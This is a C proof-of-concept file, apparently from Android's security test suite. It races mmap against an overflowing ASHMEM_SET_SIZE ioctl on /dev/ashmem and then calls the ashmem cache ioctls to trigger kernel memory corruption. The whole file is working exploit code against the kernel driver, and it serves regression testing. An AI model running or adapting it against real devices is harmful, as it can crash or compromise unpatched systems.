/**
 * Copyright (C) 2017 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/ashmem.h>
#include <pthread.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include "local_poc.h"

#define ASHMEM_CACHE_CLEAN_RANGE _IO(__ASHMEMIOC, 12)
#define ASHMEM_CACHE_FLUSH_RANGE _IO(__ASHMEMIOC, 11)
#define ASHMEM_CACHE_INV_RANGE _IO(__ASHMEMIOC, 13)

int fd;
void *addr;
pthread_barrier_t barr;

int thread_mmap_status = 0;
int thread_set_size_status = 0;

void *thread_mmap(void *);
void *thread_set_size(void *);

#define ORI_SIZE 4096 * 10

#define OVERFLOW_SIZE 0xFFFFFFFFFFFFFFFF - ORI_SIZE

int main(int argc, char **argv) {
  int ret;
  int i;
  pthread_t tid[2];
  struct stat st;
  const char *name = "_crash";
  struct ashmem_pin pin;
  char *buf;
  int size;
  void *map_again;
  void *map_buf[100];
  pid_t pid;

  for (i = 0; i < 10; i++) {
    map_buf[i] =
        mmap(NULL, 4096 * 100, PROT_READ | PROT_WRITE,
             MAP_PRIVATE | MAP_ANONYMOUS | MAP_ANON | MAP_GROWSDOWN, -1, 0);
    memset((char *)map_buf[i], 0x0, 4096 * 99);
  }

  while (1) {
    pthread_barrier_init(&barr, NULL, 2);
    thread_mmap_status = 0;
    thread_set_size_status = 0;

    fd = open("/dev/ashmem", O_RDWR);
    if (fd < 0) {
      return 0;
    }

    ret = ioctl(fd, ASHMEM_SET_SIZE, ORI_SIZE);
    if (ret < 0) {
      if (addr != MAP_FAILED) munmap(addr, ORI_SIZE);
      close(fd);
      continue;
    }

    ret = pthread_create(&tid[0], NULL, thread_mmap, NULL);
    if (ret != 0) {
      if (addr != MAP_FAILED) munmap(addr, ORI_SIZE);
      close(fd);
      return -1;
    }

    ret = pthread_create(&tid[1], NULL, thread_set_size, NULL);
    if (ret != 0) {
      if (addr != MAP_FAILED) munmap(addr, ORI_SIZE);
      close(fd);
      return -1;
    }

    pthread_join(tid[0], NULL);
    pthread_join(tid[1], NULL);

    errno = 0;
    size = ioctl(fd, ASHMEM_GET_SIZE, 0);
    if (size == (unsigned int)OVERFLOW_SIZE && addr != MAP_FAILED) break;
  }

  map_again = mmap(NULL, ORI_SIZE, PROT_READ | PROT_WRITE,
                   MAP_SHARED | MAP_NORESERVE, fd, 0);

  munmap(addr, ORI_SIZE);

  for (i = 0; i < 10; i++) {
    munmap(map_buf[i], 4096 * 100);
  }

  pid = fork();
  if (pid == 0) {
    for (i = 0; i < 1000; i++)
      mmap(NULL, 4096 * 100, PROT_READ | PROT_WRITE,
           MAP_PRIVATE | MAP_ANONYMOUS | MAP_ANON | MAP_GROWSDOWN, -1, 0);
    memset((char *)map_buf[i], 0x0, 4096 * 99);

    return 0;
  }
  sleep(4);

  ret = ioctl(fd, ASHMEM_CACHE_CLEAN_RANGE, 0);

  ret = ioctl(fd, ASHMEM_CACHE_FLUSH_RANGE, 0);
  ret = ioctl(fd, ASHMEM_CACHE_INV_RANGE, 0);
  munmap(map_again, ORI_SIZE);
  close(fd);

  return 0;
}

void *thread_mmap(void *arg) {
  pthread_barrier_wait(&barr);
  addr = mmap(NULL, ORI_SIZE, PROT_READ | PROT_WRITE,
              MAP_SHARED | MAP_NORESERVE, fd, 0);

  return NULL;
}

void *thread_set_size(void *arg) {
  pthread_barrier_wait(&barr);
  ioctl(fd, ASHMEM_SET_SIZE, OVERFLOW_SIZE);

  return NULL;
}
